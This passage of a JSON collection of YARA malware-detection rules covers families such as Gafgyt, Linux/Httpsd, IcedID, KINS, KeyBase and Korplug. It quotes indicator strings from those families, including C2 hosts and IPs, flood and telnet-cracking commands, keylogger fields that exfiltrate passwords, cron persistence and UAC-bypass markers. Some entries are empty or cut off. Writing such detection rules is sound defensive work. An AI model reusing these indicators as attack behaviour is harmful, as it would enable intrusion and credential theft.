\"2 2,282=2B2G2P2U2Z2_2h2s2x2\" fullword ascii\n\t\t$s6 = \"4'5.555<5C5J5Q5X5_5f5m5t5{5\" fullword ascii\n\t\t$s7 = \"0#0*01080?0F0M0T0[0b0i0p0w0\" fullword ascii\n\t\t$s8 = \"6$6,616=6B6G6S6X6]6i6n6s6\" fullword ascii\n\t\t$s9 = \"=\\\"=)=0=7=>=E=L=S=Z=a=h=\" fullword ascii\n\t\t$s10 = \"6&6-646;6B6I6P6W6^6e6l6s6z6\" fullword ascii\n\t\t$s11 = \"O.QrH@\" fullword ascii\n\t\t$s12 = \">\\\">/>4>A>F>S>X>e>j>w>|>\" fullword ascii\n\t\t$s13 = \"0#0(040=0B0N0T0Y0e0k0p0|0\" fullword ascii\n\t\t$s14 = \"5)5/545@5F5K5W5`5e5q5w5|5\" fullword ascii\n\t\t$s15 = \"=!=&=3=8=E=N=S=`=e=s=x=}=\" fullword ascii\n\t\t$s16 = \":(:/:6:=:D:K:R:Y:`:g:n:u:|:\" fullword ascii\n\t\t$s17 = \"7\\\"727<7F7M7W7a7k7u7\" fullword ascii\n\t\t$s18 = \"2+21262E2K2P2\\\\2h2m2|2\" fullword ascii\n\t\t$s19 = \";/;5;:;G;V;\\\\;a;n;};\" fullword ascii\n\t\t$s20 = \";\\\";-;8;C;N;^;i;t;\" fullword ascii\n\n\t\t$op0 = { ff 44 24 14 8d 47 44 50 a1 08 63 44 00 ff 90 84 } /* Opcode */\n\t\t$op1 = { 6d 43 00 c7 84 24 10 03 00 00 0c 6d 43 00 c7 84 } /* Opcode */\n\t\t$op2 = { c7 43 0c 20 02 00 00 89 5d f0 ff 90 f8 } /* Opcode */\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and filesize < 900KB and ( 10 of ($s*) )and 1 of ($op*) ) or ( all of them )\n}",
  "sig_7acb8d6d4c062c3097a7d31df103bc4d018519f9": "rule sig_7acb8d6d4c062c3097a7d31df103bc4d018519f9 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file 7acb8d6d4c062c3097a7d31df103bc4d018519f9.codex\"\n\t\tauthor = \"YarGen Rule Generator\"\n\t\treference = \"not set\"\n\t\tdate = \"2016-07-21\"\n\t\thash1 = \"e1607486cbb2d111d5df314fe58948aa0dc5897f56f7fd763c62bb30651380e3\"\n\tstrings:\n\t\t$s1 = \"5(666Z6c6\" fullword ascii\n\t\t$s2 = \"Wlm;y%UD%d\" fullword ascii\n\t\t$s3 = \";1;9;@;G;N;U;\\\\;c;j;q;x;\" fullword ascii\n\t\t$s4 = \"8 8'8.858<8C8J8Q8X8_8f8m8t8\" fullword ascii\n\t\t$s5 = \"2 2,282=2B2G2P2U2Z2_2h2s2x2\" fullword ascii\n\t\t$s6 = \"4'5.555<5C5J5Q5X5_5f5m5t5{5\" fullword ascii\n\t\t$s7 = \"0#0*01080?0F0M0T0[0b0i0p0w0\" fullword ascii\n\t\t$s8 = \"6$6,616=6B6G6S6X6]6i6n6s6\" fullword ascii\n\t\t$s9 = \"=\\\"=)=0=7=>=E=L=S=Z=a=h=\" fullword ascii\n\t\t$s10 = \"6&6-646;6B6I6P6W6^6e6l6s6z6\" fullword ascii\n\t\t$s11 = \"O.QrH@\" fullword ascii\n\t\t$s12 = \">\\\">/>4>A>F>S>X>e>j>w>|>\" fullword ascii\n\t\t$s13 = \"0#0(040=0B0N0T0Y0e0k0p0|0\" fullword ascii\n\t\t$s14 = \"5)5/545@5F5K5W5`5e5q5w5|5\" fullword ascii\n\t\t$s15 = \"=!=&=3=8=E=N=S=`=e=s=x=}=\" fullword ascii\n\t\t$s16 = \":(:/:6:=:D:K:R:Y:`:g:n:u:|:\" fullword ascii\n\t\t$s17 = \"7\\\"727<7F7M7W7a7k7u7\" fullword ascii\n\t\t$s18 = \"2+21262E2K2P2\\\\2h2m2|2\" fullword ascii\n\t\t$s19 = \";/;5;:;G;V;\\\\;a;n;}",
  "sig_5783b35b2eace55a5762df27fcb0b0fb28371b3e": "rule sig_5783b35b2eace55a5762df27fcb0b0fb28371b3e {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file 5783b35b2eace55a5762df27fcb0b0fb28371b3e.codex\"\n\t\tauthor = \"YarGen Rule Generator\"\n\t\treference = \"not set\"\n\t\tdate = \"2016-07-21\"\n\t\thash1 = \"72513534f2e0f3e77a22023b887df3718c9df70686eb0ae58cbbde2f90f447e4\"\n\tstrings:\n\t\t$s1 = \"B+P:\\\\6\" fullword ascii\n\t\t$s2 = \"6.666K6S6d6l6}",
  "sig_2fb404bdcebc7acbeb598f8a2ddbecf48c60b113": "",
  "_84b76d765e7357fa5402b5af97d351424a8edf03_d0f90c1b3ebd79a816b5597a49ae8257df697591_da24c17f75cf0b7d6c5ab01832a827ee4b4c52eb_0": "",
  "_370c433dd61ec21d2677cfe02ef93a5f32a2b50d_5bf48d77bade79f2421ae3d258fe8262c043fb8f_08bdf374b28b234e824797145206f4df79eac6ea_1": "rule _370c433dd61ec21d2677cfe02ef93a5f32a2b50d_5bf48d77bade79f2421ae3d258fe8262c043fb8f_08bdf374b28b234e824797145206f4df79eac6ea_1 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - from files 370c433dd61ec21d2677cfe02ef93a5f32a2b50d.codex, 5bf48d77bade79f2421ae3d258fe8262c043fb8f.codex, 08bdf374b28b234e824797145206f4df79eac6ea.codex\"\n\t\tauthor = \"YarGen Rule Generator\"\n\t\treference = \"not set\"\n\t\tdate = \"2016-07-21\"\n\t\tsuper_rule = 1\n\t\thash1 = \"29b4498ac81d654b52cd0a32bdf29ed955f046ef9db1e0eba7da47ab2f950a3e\"\n\t\thash2 = \"84ab50a9e325f64a54d84fb6798d8e74f46c21fd8b935d6c47a44bb140effad9\"\n\t\thash3 = \"3f326fb6a79842c657efa09b71ce5e46dc110dd324bfabfcd32730d86de0bcf5\"\n\tstrings:\n\t\t$s1 = \":$:+:2:9:@:G:N:U:\\\\:s:\" fullword ascii\n\t\t$s2 = \"6%6+606<6H6M6\\\\6b6g6v6}",
  "Gafgyt_Botnet_generic": "rule Gafgyt_Botnet_generic : MALW\n{\nmeta:\ndescription = \"Gafgyt Trojan\"\nauthor = \"Joan Soriano / @joanbtl\"\ndate = \"2017-05-01\"\nversion = \"1.0\"\nMD5 = \"e3fac853203c3f1692af0101eaad87f1\"\nSHA1 = \"710781e62d49419a3a73624f4a914b2ad1684c6a\"\n\nstrings:\n\t$etcTZ = \"/bin/busybox;echo -e 'gayfgt'\"\n\t$s2 = \"/proc/net/route\"\n\t$s3 = \"admin\"\n\t$s4 = \"root\"\n\ncondition:\n\t$etcTZ and $s2 and $s3 and $s4\n}",
  "Gafgyt_Botnet_oh": "rule Gafgyt_Botnet_oh : MALW\n{\nmeta:\ndescription = \"Gafgyt Trojan\"\nauthor = \"Joan Soriano / @joanbtl\"\ndate = \"2017-05-025\"\nversion = \"1.0\"\nMD5 = \"97f5edac312de349495cb4afd119d2a5\"\nSHA1 = \"916a51f2139f11e8be6247418dca6c41591f4557\"\n\n    strings:\n            $s1 = \"busyboxterrorist\"\n            $s2 = \"BOGOMIPS\"\n            $s3 = \"124.105.97.%d\"\n            $s4 = \"fucknet\"\n    condition:\n            $s1 and $s2 and $s3 and $s4\n}",
  "Gafgyt_Botnet_bash": "rule Gafgyt_Botnet_bash : MALW\n{\nmeta:\ndescription = \"Gafgyt Trojan\"\nauthor = \"Joan Soriano / @joanbtl\"\ndate = \"2017-05-25\"\nversion = \"1.0\"\nMD5 = \"c8d58acfe524a09d4df7ffbe4a43c429\"\nSHA1 = \"b41fefa8470f3b3657594af18d2ea4f6ac4d567f\"\n\n    strings:\n            $s1 = \"PONG!\"\n            $s2 = \"GETLOCALIP\"\n            $s3 = \"HTTPFLOOD\"\n            $s4 = \"LUCKYLILDUDE\"\n    condition:\n            $s1 and $s2 and $s3 and $s4\n}",
  "Gafgyt_Botnet_hoho": "rule Gafgyt_Botnet_hoho : MALW\n{\nmeta:\ndescription = \"Gafgyt Trojan\"\nauthor = \"Joan Soriano / @joanbtl\"\ndate = \"2017-05-25\"\nversion = \"1.0\"\nMD5 = \"369c7c66224b343f624803d595aa1e09\"\nSHA1 = \"54519d2c124cb536ed0ddad5683440293d90934f\"\n\n    strings:\n            $s1 = \"PING\"\n            $s2 = \"PRIVMSG\"\n            $s3 = \"Remote IRC Bot\"\n            $s4 = \"23.95.43.182\"\n    condition:\n            $s1 and $s2 and $s3 and $s4\n}",
  "Gafgyt_Botnet_jackmy": "rule Gafgyt_Botnet_jackmy : MALW\n{\nmeta:\ndescription = \"Gafgyt Trojan\"\nauthor = \"Joan Soriano / @joanbtl\"\ndate = \"2017-05-25\"\nversion = \"1.0\"\nMD5 = \"419b8a10a3ac200e7e8a0c141b8abfba\"\nSHA1 = \"5433a5768c5d22dabc4d133c8a1d192d525939d5\"\n\n    strings:\n            $s1 = \"PING\"\n            $s2 = \"PONG\"\n            $s3 = \"jackmy\"         \n            $s4 = \"203.134.%d.%d\"       \n    condition:\n            $s1 and $s2 and $s3 and $s4\n}",
  "Gafgyt_Botnet_HIHI": "rule Gafgyt_Botnet_HIHI: MALW\n{\nmeta:\ndescription = \"Gafgyt Trojan\"\nauthor = \"Joan Soriano / @joanbtl\"\ndate = \"2017-05-01\"\nversion = \"1.0\"\nMD5 = \"cc99e8dd2067fd5702a4716164865c8a\"\nSHA1 = \"b9b316c1cc9f7a1bf8c70400861de08d95716e49\"\n\n    strings:\n            $s1 = \"PING\"\n            $s2 = \"PONG\"\n            $s3 = \"TELNET LOGIN CRACKED - %s:%s:%s\"\n            $s4 = \"ADVANCEDBOT\"\n            $s5 = \"46.166.185.92\"\n            $s6 = \"LOLNOGTFO\"\n\n    condition:\n            $s1 and $s2 and $s3 and $s4 and $s5 and $s6\n}",
  "genome": "rule genome {\n    meta:\n        author = \"Brian Wallace @botnet_hunter\"\n        author_email = \"bwall@ballastsecurity.net\"\n        date = \"2014-09-07\"\n        description = \"Identify Genome\"\n\tstrings:\n\t    $s1 = \"Attempting to create more than one keyboard::Monitor instance\"\n        $s2 = \"{Right windows}\"\n        $s3 = \"Access violation - no RTTI data!\"\n    condition:\n        all of them\n}",
  "Glasses": "rule Glasses : Family\n{\n    meta:\n        description = \"Glasses family\"\n        author = \"Seth Hardy\"\n        last_modified = \"2021-11-18\"\n        reference_file = \"aaf262fde1738dbf0bb50213a9624cd6705ebcaeb06c5fcaf7e9f33695d3fc33\"\n        reference_url = \"https://citizenlab.ca/2013/02/apt1s-glasses-watching-a-human-rights-organization/\"\n   \n    condition:\n        GlassesCode and GlassesStrings\n        \n}",
  "Grozlex": "rule Grozlex : Stealer\n{\n\tmeta:\n\t\tauthor=\"Kevin Falcoz\"\n\t\tdate=\"20/08/2013\"\n\t\tdescription=\"Grozlex Stealer - Possible HCStealer\"\n\t\t\n\tstrings:\n\t\t$signature={4C 00 6F 00 67 00 73 00 20 00 61 00 74 00 74 00 61 00 63 00 68 00 65 00 64 00 20 00 62 00 79 00 20 00 69 00 43 00 6F 00 7A 00 65 00 6E}\n\t\n\tcondition:\n\t\t$signature\n}",
  "is__LinuxHttpsdStrings": "rule is__LinuxHttpsdStrings {\n\n    meta:\n\tdescription = \"Strings of ELF Linux/Httpsd (backdoor, downloader, remote command execution)\"\n\tref1 = \"https://imgur.com/a/8mFGk\"\n\tref2 = \"https://otx.alienvault.com/pulse/5a49115f93199b171b90a212\"\n\tref3 = \"https://misppriv.circl.lu/events/view/9952\"\n\tauthor = \"unixfreaxjp\"\n\torg = \"MalwareMustDie\"\n\tdate = \"2018-01-02\"\n\tsha256 = \"dd1266561fe7fcd54d1eb17efbbb6babaa9c1f44b36cef6e06052e22ce275ccd\"\n\tsha256 = \"1b3718698fae20b63fbe6ab32411a02b0b08625f95014e03301b49afaee9d559\"\n\t\t\n\tstrings:\n\t\t$st01 = \"k.conectionapis.com\" fullword nocase wide ascii\n\t\t$st02 = \"key=%s&host_name=%s&cpu_count=%d&os_type=%s&core_count=%s\" fullword nocase wide ascii\n\t\t$st03 = \"id=%d&result=%s\" fullword nocase wide ascii\n\t\t$st04 = \"rtime\" fullword nocase wide ascii\n\t\t$st05 = \"down\" fullword nocase wide ascii\n\t\t$st06 = \"cmd\" fullword nocase wide ascii\n\t\t$st07 = \"0 */6 * * * root\" fullword nocase wide ascii\n\t\t$st08 = \"/etc/cron.d/httpsd\" fullword nocase wide ascii\n\t\t$st09 = \"cat /proc/cpuinfo |grep processor|wc -l\" fullword nocase wide ascii\n\t\t$st10 = \"k.conectionapis.com\" fullword nocase wide ascii\n\t\t$st11 = \"/api\" fullword nocase wide ascii\n\t\t$st12 = \"/tmp/.httpslog\" fullword nocase wide ascii\n\t\t$st13 = \"/bin/.httpsd\" fullword nocase wide ascii\n\t\t$st14 = \"/tmp/.httpsd\" fullword nocase wide ascii\n\t\t$st15 = \"/tmp/.httpspid\" fullword nocase wide ascii\n\t\t$st16 = \"/tmp/.httpskey\" fullword nocase wide ascii\n\n\tcondition:\n\t\tall of them\n}",
  "Linux_Httpsd_malware_ARM": "rule Linux_Httpsd_malware_ARM {\n  \n\tmeta:\n\t\tdescription = \"Detects Linux/Httpsd ARMv5\"\n\t\tdate = \"2017-12-31\"\n\n\tstrings:\n\t\t$hexsts01 = { f0 4f 2d e9 1e db 4d e2 ec d0 4d e2 01 40 a0 e1 } // main\n\t\t$hexsts02 = { f0 45 2d e9 0b db 4d e2 04 d0 4d e2 3c 01 9f e5 } // self-rclocal\n\t\t$hexsts03 = { f0 45 2d e9 01 db 4d e2 04 d0 4d e2 bc 01 9f e5 } // copy-self\n\n\tcondition:\n\t\tall of them\n        \tand is__elf\n\t\tand is__LinuxHttpsdStrings\n\t\tand filesize < 200KB \n}",
  "Linux_Httpsd_malware_i686": "rule Linux_Httpsd_malware_i686 {\n\n\tmeta:\n\t\tdescription = \"Detects ELF Linux/Httpsd i686\"\n\t\tdate = \"2018-01-02\"\n\n\t\n\tstrings:\n\t\t$hexsts01 = { 8d 4c 24 04 83 e4 f0 ff 71 fc 55 89 e5 57 56 53 } // main\n\t\t$hexsts02 = { 55 89 e5 57 56 53 81 ec 14 2c 00 00 68 7a 83 05 } // self-rclocal\n\t\t$hexsts03 = { 55 89 e5 57 56 53 81 ec 10 04 00 00 68 00 04 00 } // copy-self\n\n\tcondition:\n\t\tall of them\n        \tand is__elf\n\t\tand is__LinuxHttpsdStrings\n\t\tand filesize < 200KB \n}",
  "IMuler": "rule IMuler : Family\n{\n    meta:\n        description = \"IMuler\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-16\"\n        \n    condition:\n        IMulerCode or IMulerStrings\n}",
  "IceID_Bank_trojan": "rule IceID_Bank_trojan {\n\n\tmeta:\n\t\tdescription = \"Detects IcedID..adjusted several times\"\n\t\tauthor = \"unixfreaxjp\"\n\t\torg = \"MalwareMustDie\"\n\t\tdate = \"2018-01-14\"\n    \n\tstrings:\n\t\t$header = { 4D 5A }\n\t\t$magic1 = { E8 ?? ?? ?? ?? E9 ?? ?? ?? ?? 6A ?? 68 ?? ?? }\n\t\t$st01 = \"CCmdTarget\" fullword nocase wide ascii\n\t\t$st02 = \"CUserException\" fullword nocase wide ascii\n\t\t$st03 = \"FileType\" fullword nocase wide ascii\n\t\t$st04 = \"FlsGetValue\" fullword nocase wide ascii\n\t\t$st05 = \"AVCShellWrapper@@\" fullword nocase wide ascii\n\t\t$st06 = \"AVCCmdTarget@@\" fullword nocase wide ascii\n\t\t$st07 = \"AUCThreadData@@\" fullword nocase wide ascii\n\t\t$st08 = \"AVCUserException@@\" fullword nocase wide ascii\n\n\tcondition:\n\t\t$header at 0 and all of ($magic*) and 6 of ($st0*)\n\t\tand pe.sections[0].name contains \".text\"\n\t\tand pe.sections[1].name contains \".rdata\"\n\t\tand pe.sections[2].name contains \".data\"\n\t\tand pe.sections[3].name contains \".rsrc\"\n\t\tand pe.characteristics & pe.EXECUTABLE_IMAGE\n\t\tand pe.characteristics & pe.RELOCS_STRIPPED\n}",
  "iexpl0re": "rule iexpl0re : Family\n{\n    meta:\n        description = \"iexpl0re family\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-21\"\n   \n    condition:\n        iexpl0reCode or iexpl0reStrings\n        \n}",
  "Insta11": "rule Insta11 : Family\n{\n    meta:\n        description = \"Insta11\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-23\"\n        \n    condition:\n        Insta11Code or Insta11Strings\n}",
  "Intel_Virtualization_Wizard_exe": "rule Intel_Virtualization_Wizard_exe {\n  meta:\n    author = \"cabrel@zerklabs.com\"\n    description = \"Dynamic DLL abuse executable\"\n\n    file_1_seen = \"2013-05-21\"\n    file_1_sha256 = \"7787757ae851f4a162f46f794be1532ab78e1928185212bdab83b3106f28c708\"\n\n  strings:\n    $a = {4C 6F 61 64 53 54 52 49 4E 47}\n    $b = {49 6E 69 74 69 61 6C 69 7A 65 4B 65 79 48 6F 6F 6B}\n    $c = {46 69 6E 64 52 65 73 6F 75 72 63 65 73}\n    $d = {4C 6F 61 64 53 54 52 49 4E 47 46 72 6F 6D 48 4B 43 55}\n    $e = {68 63 63 75 74 69 6C 73 2E 44 4C 4C}\n  condition:\n    all of them\n}",
  "Intel_Virtualization_Wizard_dll": "rule Intel_Virtualization_Wizard_dll {\n  meta:\n    author = \"cabrel@zerklabs.com\"\n    description = \"Dynamic DLL (Malicious)\"\n\n    file_1_seen = \"2013-05-21\"\n    file_1_sha256 = \"485ae043b6a5758789f1d33766a26d8b45b9fde09cde0512aa32d4bd1ee04f28\"\n\n  strings:\n    $a = {48 3A 5C 46 61 73 74 5C 50 6C 75 67 28 68 6B 63 6D 64 29 5C}\n    $b = {64 6C 6C 5C 52 65 6C 65 61 73 65 5C 48 69 6A 61 63 6B 44 6C 6C 2E 70 64 62}\n\n  condition:\n    ($a and $b) and Intel_Virtualization_Wizard_exe\n}",
  "IotReaper": "rule IotReaper: MALW\n{\n\tmeta:\n\t\tdescription = \"Linux.IotReaper\"\n\t\tauthor = \"Joan Soriano / @w0lfvan\"\n\t\tdate = \"2017-10-30\"\n\t\tversion = \"1.0\"\n\t\tMD5 = \"95b448bdf6b6c97a33e1d1dbe41678eb\"\n\t\tSHA256 = \"b463ca6c3ec7fa19cd318afdd2fa2365fa9e947771c21c4bd6a3bc2120ba7f28\"\n\tstrings:\n\t\t$a = \"weruuoqweiur.com\"\n\t\t$b = \"rm -f /tmp/ftpupload.sh \\n\"\n\t\t$c = \"%02x-%02x-%02x-%02x-%02x-%02x\"\n\tcondition:\n\t\tall of them\n}",
  "Backdoor_Jolob": "rule Backdoor_Jolob\n{\n\tmeta:\n\t\tmaltype = \"Backdoor.Jolob\"\n    ref = \"https://github.com/reed1713\"\n\t\treference = \"http://www.symantec.com/connect/blogs/new-flash-zero-day-linked-yet-more-watering-hole-attacks\"\n\t\tdescription = \"the backdoor registers an auto start service with the display name \\\"Network Access Management Agent\\\" pointing to the dll netfilter.dll. This is accomplished without notifying the user via the sysprep UAC bypass method.\"\n\tstrings:   \n\t\t$type = \"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid = \"4673\"\n\t\t$data1 = \"Security\"\n\t\t$data2 = \"SeCreateGlobalPrivilege\"\n\t\t$data3 = \"Windows\\\\System32\\\\sysprep\\\\sysprep.exe\" nocase\n        \n\t\t$type1 = \"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid1 = \"4688\"\n\t\t$data4 = \"Windows\\\\System32\\\\sysprep\\\\sysprep.exe\" nocase\n        \n\t\t$type2 = \"Service Control Manager\"\n\t\t$eventid2 = \"7036\"\n\t\t$data5 = \"Network Access Management Agent\"\n\t\t$data6 = \"running\"\n        \n\t\t$type3 = \"Service Control Manager\"\n\t\t$eventid3 = \"7045\"\n\t\t$data7 = \"Network Access Management Agent\"\n\t\t$data8 = \"user mode service\"\n\t\t$data9 = \"auto start\"      \n    condition:\n    \tall of them\n}",
  "KINS_dropper": "rule KINS_dropper : dropper {\n\tmeta:\n\t\tauthor = \"AlienVault Labs aortega@alienvault.com\"\n\t\tdescription = \"Match protocol, process injects and windows exploit present in KINS dropper\"\n\t\treference = \"http://goo.gl/arPhm3\"\n\tstrings:\n\t\t// Network protocol\n\t\t$n1 = \"tid=%d&ta=%s-%x\" fullword\n\t\t$n2 = \"fid=%d\" fullword\n\t\t$n3 = \"%[^.].%[^(](%[^)])\" fullword\n\t\t// Injects\n\t\t$i0 = \"%s [%s %d] 77 %s\"\n\t\t$i01 = \"Global\\\\%s%x\"\n\t\t$i1 = \"Inject::InjectProcessByName()\"\n\t\t$i2 = \"Inject::CopyImageToProcess()\"\n\t\t$i3 = \"Inject::InjectProcess()\"\n\t\t$i4 = \"Inject::InjectImageToProcess()\"\n\t\t$i5 = \"Drop::InjectStartThread()\"\n\t\t// UAC bypass\n\t\t$uac1 = \"ExploitMS10_092\"\n\t\t$uac2 = \"\\\\globalroot\\\\systemroot\\\\system32\\\\tasks\\\\\" ascii wide\n\t\t$uac3 = \"<RunLevel>HighestAvailable</RunLevel>\" ascii wide\n\tcondition:\n\t\t2 of ($n*) and 2 of ($i*) and 2 of ($uac*)\n}",
  "KINS_DLL_zeus": "rule KINS_DLL_zeus {\n\tmeta:\n\t\tauthor = \"AlienVault Labs aortega@alienvault.com\"\n\t\tdescription = \"Match default bot in KINS leaked dropper, Zeus\"\n\t\treference = \"http://goo.gl/arPhm3\"\n\tstrings:\n\t\t// Network protocol\n\t\t$n1 = \"%BOTID%\" fullword\n\t\t$n2 = \"%opensocks%\" fullword\n\t\t$n3 = \"%openvnc%\" fullword\n\t\t$n4 = /Global\\\\(s|v)_ev/ fullword\n\t\t// Crypted strings\n\t\t$s1 = \"\\x72\\x6E\\x6D\\x2C\\x36\\x7D\\x76\\x77\"\n\t\t$s2 = \"\\x18\\x04\\x0F\\x12\\x16\\x0A\\x1E\\x08\\x5B\\x11\\x0F\\x13\"\n\t\t$s3 = \"\\x39\\x1F\\x01\\x07\\x15\\x19\\x1A\\x33\\x19\\x0D\\x1F\"\n\t\t$s4 = \"\\x62\\x6F\\x71\\x78\\x63\\x61\\x7F\\x69\\x2D\\x67\\x79\\x65\"\n\t\t$s5 = \"\\x6F\\x69\\x7F\\x6B\\x61\\x53\\x6A\\x7C\\x73\\x6F\\x71\"\n\tcondition:\n\t\tall of ($n*) and 1 of ($s*)\n}",
  "KelihosHlux": "rule KelihosHlux\n{\n  meta:\n\tauthor = \"@malpush\"\n\tmaltype = \"KelihosHlux\"\n\tdescription = \"http://malwared.ru\"\n\tdate = \"22/02/2014\"\n  strings:\n    $KelihosHlux_HexString = { 73 20 7D 8B FE 95 E4 12 4F 3F 99 3F 6E C8 28 26 C2 41 D9 8F C1 6A 72 A6 CE 36 0F 73 DD 2A 72 B0 CC D1 07 8B 2B 98 73 0E 7E 8C 07 DC 6C 71 63 F4 23 27 DD 17 56 AE AB 1E 30 52 E7 54 51 F7 20 ED C7 2D 4B 72 E0 77 8E B4 D2 A8 0D 8D 6A 64 F9 B7 7B 08 70 8D EF F3 9A 77 F6 0D 88 3A 8F BB C8 89 F5 F8 39 36 BA 0E CB 38 40 BF 39 73 F4 01 DC C1 17 BF C1 76 F6 84 8F BD 87 76 BC 7F 85 41 81 BD C6 3F BC 39 BD C0 89 47 3E 92 BD 80 60 9D 89 15 6A C6 B9 89 37 C4 FF 00 3D 45 38 09 CD 29 00 90 BB B6 38 FD 28 9C 01 39 0E F9 30 A9 66 6B 19 C9 F8 4C 3E B1 C7 CB 1B C9 3A 87 3E 8E 74 E7 71 D1 }\n   \n  condition:\n    $KelihosHlux_HexString\n}",
  "MALW_KeyBase": "rule MALW_KeyBase\n{\nmeta:\n\tdescription = \"Identifies KeyBase aka Kibex.\"\n\tauthor = \"@bartblaze\"\n\tdate = \"2019-02\"\n\ttlp = \"White\"\n\nstrings:\t\n\t$s1 = \" End:]\" ascii wide\n\t$s2 = \"Keystrokes typed:\" ascii wide\n\t$s3 = \"Machine Time:\" ascii wide\n\t$s4 = \"Text:\" ascii wide\n\t$s5 = \"Time:\" ascii wide\n\t$s6 = \"Window title:\" ascii wide\n\t\n\t$x1 = \"&application=\" ascii wide\n\t$x2 = \"&clipboardtext=\" ascii wide\n\t$x3 = \"&keystrokestyped=\" ascii wide\n\t$x4 = \"&link=\" ascii wide\n\t$x5 = \"&username=\" ascii wide\n\t$x6 = \"&windowtitle=\" ascii wide\n\t$x7 = \"=drowssap&\" ascii wide\n\t$x8 = \"=emitenihcam&\" ascii wide\n\ncondition:\n\tuint16(0) == 0x5a4d and (\n\t\t5 of ($s*) or 6 of ($x*) or\n\t\t( 4 of ($s*) and 4 of ($x*) )\n\t)\n}",
  "korlia": "rule korlia\n{ \nmeta:\nauthor = \"Nick Hoffman\" \ncompany = \"Morphick\"\nreference = \"http://www.morphick.com/resources/lab-blog/curious-korlia\"\ninformation = \"korlia malware found in apt dump\" \n\n//case a\n//b2 1f mov dl, 0x1f ; mov key (wildcard) \n// ----------------- \n//8A 86 98 40 00 71 mov al, byte ptr url[esi]\n//BF 98 40 00 71 mov edi, offset url \n//32 C2 xor al, dl \n//83 C9 FF or ecx, 0FFFFFFFFh \n//88 86 98 40 00 71 mov byte ptr url[esi], al \n//33 C0 xor eax, eax \n//46 inc esi \n//F2 AE repne scasb \n//F7 D1 not ecx \n//49 dec ecx \n//3B F1 cmp esi, ecx \n//72 DE jb short loc_71001DE0\n\n//case b (variant of loop a) \n//8A 8A 28 50 40 00 mov cl, byte_405028[edx] \n//BF 28 50 40 00 mov edi, offset byte_405028 \n//32 CB xor cl, bl \n//33 C0 xor eax, eax \n//88 8A 28 50 40 00 mov byte_405028[edx], cl\n//83 C9 FF or ecx, 0FFFFFFFFh \n//42 inc edx \n//F2 AE repne scasb \n//F7 D1 not ecx \n//49 dec ecx \n//3B D1 cmp edx, ecx \n//72 DE jb short loc_4047F2 \n\n//case c (not a variant of the above loop) \n//8A 0C 28 mov cl, [eax+ebp] \n//80 F1 28 xor cl, 28h \n//88 0C 28 mov [eax+ebp], cl \n//8B 4C 24 14 mov ecx, [esp+0D78h+var_D64]\n//40 inc eax \n//3B C1 cmp eax, ecx \n//7C EE jl short loc_404F1C \n\nstrings:\n$a = {b2 ?? 8A 86 98 40 00 71 BF 98 40 00 71 32 c2 83 C9 FF 88 86 98 40 00 71 33 C0 46 F2 AE F7 D1 49 3B F1} \n$b = {B3 ?? ?? ?? 8A 8A 28 50 40 00 BF 28 50 40 00 32 CB 33 C0 88 8A 28 50 40 00 83 C9 FF 42 F2 AE F7 D1 49 3B D1} \n$c = {8A 0C 28 80 F1 ?? 88 0C 28 8B 4C 24 14 40 3B C1} \n$d = {00 62 69 73 6F 6E 61 6C 00} //config marker \"\\x00bisonal\\x00\"\ncondition:\nany of them \n}",
  "Korplug_FAST": "rule Korplug_FAST {\n    meta:\n        description = \"Rule to detect Korplug/PlugX FAST variant\"\n        author = \"Florian Roth\"\n        date = \"2015-08-20\"\n        hash = \"c437465db42268332543fbf6fd6a560ca010f19e0fd56562fb83fb704824b371\"\n    strings:\n        $x1 = \"%s\\\\rundll32.exe \\\"%s\\\", ShadowPlay\" fullword ascii\n\n        $a1 = \"ShadowPlay\" fullword ascii\n\n        $s1 = \"%s\\\\rundll32.exe \\\"%s\\\",\" fullword ascii\n        $s2 = \"nvdisps.dll\" fullword ascii\n        $s3 = \"%snvdisps.dll\" fullword ascii\n        $s4 = \"\\\\winhlp32.exe\" fullword ascii\n        $s5 = \"nvdisps_user.dat\" fullword ascii\n        $s6 = \"%snvdisps_user.dat\" fullword ascii\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and \n        (\n            $x1 or\n            ($a1 and 1 of ($s*)) or \n            4 of ($s*)\n        )\n}",
  "Korplug": "rule Korplug\n{ \n\tmeta:\n\t\tmaltype = \"Korplug Backdoor\"\n        author = \"https://github.com/reed1713\"\n\t\treference = \"http://www.symantec.com/connect/blogs/new-sample-backdoorkorplug-signed-stolen-certificate\"\n\t\tdescription = \"IOC looks for events associated with the KORPLUG Backdoor linked to the recent operation greedy wonk activity.\"\n\t\t\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid=\"4688\"\n\t\t$data=\"ProgramData\\\\RasTls\\\\RasTls.exe\"\n\n\t\t$type1=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid1=\"4688\"\n\t\t$data1=\"ProgramData\\\\RasTls\\\\rundll32.exe\"\n\n\t\t$type2=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid2=\"4688\"\n\t\t$data2=\"ProgramData\\\\RasTls\\\\svchost.exe\"\n\tcondition:\n\t\tall of them\n}",
  "Kovter": "rule Kovter\n{ \n\tmeta:\n\t\tmaltype = \"Kovter\"\n    reference = \"http://blog.airbuscybersecurity.com/post/2016/03/FILELESS-MALWARE-%E2%80%93-A-BEHAVIOURAL-ANALYSIS-OF-KOVTER-PERSISTENCE\"\n\t\tdate = \"9-19-2016\"\n\t\tdescription = \"fileless malware\"\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\" wide ascii\n\t\t$eventid=\"4688\" wide ascii\n\t\t$data=\"Windows\\\\System32\\\\regsvr32.exe\" wide ascii\n\t\t\n\t\t$type1=\"Microsoft-Windows-Security-Auditing\" wide ascii\n\t\t$eventid1=\"4689\" wide ascii\n\t\t$data1=\"Windows\\\\System32\\\\mshta.exe\" wide ascii\n\t\t\n\t\t$type2=\"Microsoft-Windows-Security-Auditing\" wide ascii\n\t\t$eventid2=\"4689\" wide ascii\n\t\t$data2=\"Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" wide 